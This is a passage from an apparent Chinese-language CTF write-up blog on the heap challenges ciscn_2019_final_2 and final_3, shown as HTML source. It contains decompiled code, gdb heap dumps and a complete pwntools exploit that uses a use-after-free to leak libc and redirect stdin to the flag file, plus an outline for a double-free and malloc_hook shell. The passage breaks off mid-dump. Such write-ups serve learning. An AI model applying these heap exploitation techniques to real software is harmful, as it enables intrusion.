class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><strong>init</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no such file :flag&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">dup2(fd, <span class="number">666</span>);</span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>dup2(fd, 666)</code>的意思是，<code>newfd</code>指向<code>oldfd</code>句柄指向的文件描述符结构，即原本是指向标准输出文件描述结构体的666指向了<code>flag</code>，这样一来，原本输出<br />
到显示器终端的字符串就打印到test.file文件中了，这也是Linux操作系统的重定向实现方法</p>
<p><code>fileno()</code>用来取得参数stream指定的文件流所使用的文件描述词<br />
返回值 ：返回和stream文件流对应的文件描述符。如果失败，返回-1</p>
</blockquote>
<p><strong>bye_bye</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">bye_bye</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say at last? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your message :%s we have received...\n&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;have fun !&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>结合<code>init</code>可知，最后基本上就靠这个函数得到flag了</p>
</blockquote>
<p><strong>delete</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 == <span class="number">1</span> &amp;&amp; int_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(int_pt);</span><br><span class="line">      <span class="type">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> &amp;&amp; short_pt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(short_pt);</span><br><span class="line">      <span class="type">bool</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;remove success !&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>释放指针指向的地址后，指针未置零</p>
</blockquote>
<p><strong>add</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    int_pt = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !int_pt )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="type">bool</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your inode number:&quot;</span>);</span><br><span class="line">    v0 = (<span class="type">int</span> *)int_pt;</span><br><span class="line">    *v0 = get_atoi();</span><br><span class="line">    *((_DWORD *)int_pt + <span class="number">2</span>) = *(_DWORD *)int_pt;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;add success !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    short_pt = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !short_pt )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="type">bool</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your inode number:&quot;</span>);</span><br><span class="line">    v1 = get_atoi();</span><br><span class="line">    *(_WORD *)short_pt = v1;</span><br><span class="line">    *((_WORD *)short_pt + <span class="number">4</span>) = *(_WORD *)short_pt;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;add success !&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>每次分配的空间都是固定的</p>
</blockquote>
<p><strong>.bss</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202050 int_pt          dq ?                    ; DATA XREF: show+4E↑r</span><br><span class="line">.bss:0000000000202050                                         ; show+5A↑r ...</span><br><span class="line">.bss:0000000000202058                 public short_pt</span><br><span class="line">.bss:0000000000202058 ; void *short_pt</span><br><span class="line">.bss:0000000000202058 short_pt        dq ?                    ; DATA XREF: show+7C↑r</span><br><span class="line">.bss:0000000000202058                                         ; show+88↑r ...</span><br><span class="line">.bss:0000000000202060                 public _bool</span><br><span class="line">.bss:0000000000202060 _bool           dd ?                    ; DATA XREF: allocate:loc_F8C↑w</span><br><span class="line">.bss:0000000000202060                                         ; allocate:loc_1009↑w ...</span><br><span class="line">.bss:0000000000202064                 align 8</span><br><span class="line">.bss:0000000000202064 _bss            ends</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>int_pt</code>和<code>short_pt</code>均为全局指针变量</p>
</blockquote>
<blockquote>
<p>环境是ubuntu18，应该是用<code>tcache</code>累加得到一个<code>unsorted bin</code>，最后释放后得到<code>libc base</code>,得到<code>fileno</code>；然后利用<code>house of spirit</code>将stdin的<code>fileno</code>改为666，<code>scanf</code>就会从flag文件读取flag</p>
</blockquote>
<h3 id="gdb"><a class="markdownIt-Anchor" href="#gdb"></a> GDB</h3>
<h4 id="over_lappinglibc_leak"><a class="markdownIt-Anchor" href="#over_lappinglibc_leak"></a> over_lapping+libc_leak</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line"> 	add(<span class="number">1</span>,<span class="number">0x30</span>) <span class="comment">#0x10</span></span><br><span class="line">    remove(<span class="number">1</span>) <span class="comment">#加入tcache</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment">#0x20</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment">#0x20</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment">#0x20</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>) <span class="comment">#0x20</span></span><br><span class="line">    remove(<span class="number">2</span>) <span class="comment">#加入tcache</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>) <span class="comment">#0x10</span></span><br><span class="line">    remove(<span class="number">2</span>) <span class="comment">#加入tcache</span></span><br><span class="line">    addr_chunk0_prev_size = show(<span class="number">2</span>) - <span class="number">0xa0</span></span><br><span class="line">    add(<span class="number">2</span>, addr_chunk0_prev_size)</span><br><span class="line">    add(<span class="number">2</span>, addr_chunk0_prev_size)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line"><span class="number">0x563281ce9250</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">145</span>, </span><br><span class="line">  mchunk_size = <span class="number">145</span>, </span><br><span class="line">  fd = <span class="number">0x30</span>, </span><br><span class="line">  bk = <span class="number">0x30</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x563281ce92e0</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x563281ce9250</span>, </span><br><span class="line">  bk = <span class="number">0x9250</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20d01</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其实是通过mchunk来实现合并，相关链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/97158973">堆漏洞挖掘:08—chunk的mchunk_prev_size成员的空间复用</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">        remove(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line"><span class="number">0x55fcf5564250</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">145</span>, </span><br><span class="line">  mchunk_size = <span class="number">145</span>, </span><br><span class="line">  fd = <span class="number">0x7f00598fcca0</span> &lt;main_arena+<span class="number">96</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x7f00598fcca0</span> &lt;main_arena+<span class="number">96</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [ -<span class="number">1</span>]: <span class="number">0</span></span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x55fcf5564260</span> —▸ <span class="number">0x7f00598fcca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x55fcf55643e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">.........................</span><br><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x55fcf5564250</span> —▸ <span class="number">0x7f00598fcca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55fcf5564250</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>不断申请和释放，由于<code>tcache</code>最多只能存储7个chunk，所以之前的全部被分配进了<code>unsorted bin</code>，实现了chunk的合并，之后偶就是常规的找地址了</p>
</blockquote>
<h3 id="4exp-6"><a class="markdownIt-Anchor" href="#4exp-6"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_final_2&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_final_2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/joe1sn/libc/64/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">add_type, add_num</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(add_type))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;your inode number:&#x27;</span>, <span class="built_in">str</span>(add_num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">remove_type</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(remove_type))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">show_type</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(show_type))</span><br><span class="line">    <span class="keyword">if</span> show_type == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> show_type == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">	remove(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">	remove(<span class="number">2</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">	remove(<span class="number">2</span>)</span><br><span class="line">	addr_chunk0_prev_size = show(<span class="number">2</span>) - <span class="number">0xa0</span></span><br><span class="line">	add(<span class="number">2</span>, addr_chunk0_prev_size)</span><br><span class="line">	add(<span class="number">2</span>, addr_chunk0_prev_size)</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">	    remove(<span class="number">1</span>)</span><br><span class="line">	    add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">	remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	addr_main_arena = show(<span class="number">1</span>) - <span class="number">96</span></span><br><span class="line">	libcbase = addr_main_arena - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">	addr__IO_2_1_stdin__fileno = libcbase + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">0x70</span></span><br><span class="line">	log.success(<span class="string">&quot;libc base &gt; %x&quot;</span>,libcbase)</span><br><span class="line">	log.success(<span class="string">&quot;addr IO 2 1 stdin fileno &gt; %x&quot;</span>,addr__IO_2_1_stdin__fileno)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	add(<span class="number">1</span>, addr__IO_2_1_stdin__fileno)</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x30</span>) </span><br><span class="line">	remove(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x20</span>)</span><br><span class="line">	remove(<span class="number">1</span>)</span><br><span class="line">	addr_chunk0_fd = show(<span class="number">1</span>) - <span class="number">0x30</span></span><br><span class="line">	add(<span class="number">1</span>, addr_chunk0_fd)</span><br><span class="line">	add(<span class="number">1</span>, addr_chunk0_fd)</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">111</span>)</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;your message :&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>EXP来源 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/12409143.html">PwnKi-ciscn_2019_final_2</a></strong></p>
<h2 id="ciscn_2019_final_3"><a class="markdownIt-Anchor" href="#ciscn_2019_final_3"></a> ciscn_2019_final_3</h2>
<h3 id="1checksec-25"><a class="markdownIt-Anchor" href="#1checksec-25"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="2ida-24"><a class="markdownIt-Anchor" href="#2ida-24"></a> 2.IDA</h3>
<p>只有add和remove</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;the size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;something&quot;</span>,data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;the index&quot;</span>,<span class="built_in">str</span>(idx)) </span><br></pre></td></tr></table></figure>
<p><strong>add</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;input the size&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &lt;= <span class="number">0x78</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">HIDWORD</span>(size);</span><br><span class="line">    qword_2022A0[v2] = <span class="built_in">malloc</span>((<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br><span class="line">    v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;now you can write something&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">READ</span>(qword_2022A0[<span class="built_in">HIDWORD</span>(size)], size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gift :%p\n&quot;</span>, qword_2022A0[<span class="built_in">HIDWORD</span>(size)]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>对申请的堆的大小进行了判断，并且可以给我们挡墙申请堆块的地址</p>
</blockquote>
<p><strong>remove</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0x18</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(qword_2022A0[v2]);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>指针没有清零，所以我们可以多次释放来形成<code>unsorted bin</code>；</p>
<p>然后释放<code>unsorted bin</code>，来泄露<code>libc base</code>和<code>malloc hook</code>；</p>
<p>最后通过<code>malloc hook</code>+<code>one gadget</code>来getshehll</p>
</blockquote>
<h3 id="3gdb-5"><a class="markdownIt-Anchor" href="#3gdb-5"></a> 3.GDB</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#code</span><br><span class="line">heap=add(0,0x78,&#x27;a&#x27;)#0</span><br><span class="line">print(hex(heap))</span><br><span class="line">add(1,0x18,&#x27;b&#x27;)#1</span><br><span class="line">add(2,0x78,&#x27;c&#x27;)#2</span><br><span class="line">add(3,0x78,&#x27;d&#x27;)#3 </span><br><span class="line">add(4,0x78,&#x27;c&#x27;)#4</span><br><span class="line">add(5,0x78,&#x27;d&#x27;)#5 </span><br><span class="line">add(6,0x78,&#x27;c&#x27;)#6</span><br><span class="line">add(7,0x78,&#x27;d&#x27;)#7 </span><br><span class="line">add(8,0x78,&#x27;c&#x27;)#8</span><br><span class="line">add(9,0x78,&#x27;d&#x27;)#9 </span><br><span class="line">add(10,0x78,&#x27;c&#x27;)#10</span><br><span class="line">add(11,0x78,&#x27;d&#x27;)#11</span><br><span class="line">add(12,0x28,&#x27;d&#x27;)#12</span><br><span class="line">#dup (double free)</span><br><span class="line">free(12)</span><br><span class="line">free(12)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">#输出&gt; 0x557389971e70</span><br><span class="line">#GDB</span><br><span class="line">0x557389971e60 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 129, </span><br><span class="line">  fd = 0xa61, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x557389971ee0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 33, </span><br><span class="line">  fd = 0xa62, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x81</span><br><span class="line">&#125;</span><br><span class="line">0x557389971f00 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 129, </span><br><span class="line">  fd = 0xa63, </span><br><span 